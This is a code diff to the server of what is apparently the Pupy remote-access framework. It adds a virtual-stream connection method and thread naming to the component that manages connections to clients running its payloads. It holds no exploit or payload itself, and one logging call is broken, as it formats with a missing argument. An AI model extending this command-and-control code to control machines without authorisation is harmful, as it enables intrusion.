@@ -53,6 +53,7 @@ from network.transports.ssl.conf import PupySSLAuthenticator
 from network.lib.connection import PupyConnectionThread
 from network.lib.servers import PupyTCPServer
 from network.lib.streams.PupySocketStream import PupySocketStream, PupyUDPSocketStream
+from network.lib.streams.PupyVirtualStream import PupyVirtualStream
 
 from network.lib.utils import parse_transports_args
 from network.lib.base import chain_transports
@@ -76,6 +77,7 @@ class Listener(Thread):
     def __init__(self, pupsrv, name, args, httpd=False, igd=False, local=None, external=None, pproxy=None):
         Thread.__init__(self)
         self.daemon = True
+        self.name = 'Listener({})'.format(name)
 
         self.igd = igd
         self.server = None
@@ -867,6 +869,46 @@ class PupyServer(object):
         if job_id not in self.jobs:
             raise PupyModuleError("%s: no such job !"%job_id)
         return self.jobs[job_id]
+
+    def create_virtual_connection(self, transport, peer):
+        if not transport in transports:
+            logger.error('Unknown transport: {}'.format())
+            return
+
+        logger.debug('create_virtual_connection({}, {})'.format(transport, peer))
+
+        transport_conf = transports.get(transport)
+        transport_class = transport_conf().server_transport
+
+        logger.debug('create_virtual_connection({}, {}) - transport - {} / {}'.format(
+            transport, peer, transport_conf, transport_class))
+
+        stream = PupyVirtualStream(transport_class)
+
+        vc = PupyConnectionThread(
+            self,
+            PupyService,
+            PupyChannel(stream),
+            ping=stream.KEEP_ALIVE_REQUIRED,
+            config={
+                'connid': '{}:{}'.format(peer, id(self))
+            })
+
+        def activate(peername, on_receive):
+            logger.debug('VirtualStream ({}, {}) - activating'.format(
+                stream, peername))
+
+            stream.activate(peername, on_receive)
+
+            logger.debug('VirtualStream ({}, {}) - starting thread'.format(
+                stream, peername))
+
+            vc.start()
+
+            logger.debug('VirstualStream ({}, {}) - activated'.format(
+                stream, peername))
+
+        return activate, stream.submit, stream.close
 
     def connect_on_client(self, launcher):
         """ connect on a client that would be running a bind payload """
